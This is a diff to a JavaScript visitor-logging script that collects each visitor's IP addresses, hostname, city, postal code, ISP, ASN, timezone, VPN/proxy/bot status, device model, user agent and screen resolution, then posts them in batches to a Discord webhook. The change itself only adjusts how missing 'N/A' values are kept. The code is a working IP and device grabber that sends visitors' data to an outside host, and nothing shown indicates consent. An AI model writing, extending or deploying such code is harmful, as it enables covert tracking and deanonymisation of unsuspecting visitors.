@@ -78,7 +78,7 @@
   async function sendDiscordWebhook(embeds) {
     if (!embeds || embeds.length === 0) throw new Error("No embeds to send");
 
-    // Clean embeds: sanitize names and values, remove empty
+    // Clean embeds: sanitize names and values, but keep all fields including N/A
     const cleanEmbeds = embeds.map(embed => {
       if (!embed.fields || embed.fields.length === 0) return embed;
       embed.fields = embed.fields
@@ -86,11 +86,9 @@
           const name = sanitizeFieldName(f.name);
           const value = sanitizeFieldValue(f.value);
           return { name, value, inline: !!f.inline };
-        })
-        // remove fields with empty name or value
-        .filter(f => f.name !== "N/A" && f.value !== "N/A");
+        });
       return embed;
-    }).filter(embed => embed.fields && embed.fields.length > 0);
+    });
 
     if (cleanEmbeds.length === 0) throw new Error("No valid embed fields after sanitizing");
 
@@ -141,22 +139,22 @@
       }
 
       const allFields = [
-        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
-        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
-        { name: "Hostname", value: safeValue(data.hostname), inline: true },
-        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
-        { name: "Region", value: safeValue(data.region), inline: true },
-        { name: "City", value: safeValue(data.city), inline: true },
-        { name: "Zip", value: safeValue(data.postal), inline: true },
-        { name: "ISP", value: safeValue(data.isp), inline: false },
-        { name: "Organization", value: safeValue(data.org), inline: false },
-        { name: "ASN", value: safeValue(data.asn), inline: true },
-        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
-        { name: "Local Time", value: safeValue(localTime), inline: true },
-        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
-        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
-        { name: "Mobile", value: safeValue(isMobile ? "Yes" : "No"), inline: true },
-        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
+        { name: "IPv4 Address", value: `\`${data.ip || "N/A"}\``, inline: true },
+        { name: "IPv6 Address", value: data.ipv6 || "N/A", inline: true },
+        { name: "Hostname", value: data.hostname || "N/A", inline: true },
+        { name: "Country", value: `${data.country || "N/A"} (${data.country_code || "N/A"})`, inline: true },
+        { name: "Region", value: data.region || "N/A", inline: true },
+        { name: "City", value: data.city || "N/A", inline: true },
+        { name: "Zip", value: data.postal || "N/A", inline: true },
+        { name: "ISP", value: data.isp || "N/A", inline: false },
+        { name: "Organization", value: data.org || "N/A", inline: false },
+        { name: "ASN", value: data.asn || "N/A", inline: true },
+        { name: "Timezone", value: `${data.timezone_gmt || "N/A"} (${data.timezone || "N/A"})`, inline: true },
+        { name: "Local Time", value: localTime || "N/A", inline: true },
+        { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No", inline: true },
+        { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No", inline: true },
+        { name: "Mobile", value: isMobile ? "Yes" : "No", inline: true },
+        { name: "Bot", value: safeGet(data, ['security', 'is_bot']) ? "Yes" : "No", inline: true },
         { name: "Device Model", value: deviceModel, inline: true },
         { name: "Device Type", value: deviceType, inline: true },
         { name: "Device Vendor", value: deviceVendor, inline: true },
@@ -167,14 +165,6 @@
         { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
         { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
       ];
-
-      // Helper to sanitize values for Discord field limits
-      function safeValue(val, maxLen=1024) {
-        if (val === undefined || val === null || val === '') return "N/A";
-        val = val.toString();
-        if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
-        return val;
-      }
 
       const embedChunks = chunkArray(allFields, 25);
       await sendDiscordWebhook(embedChunks);
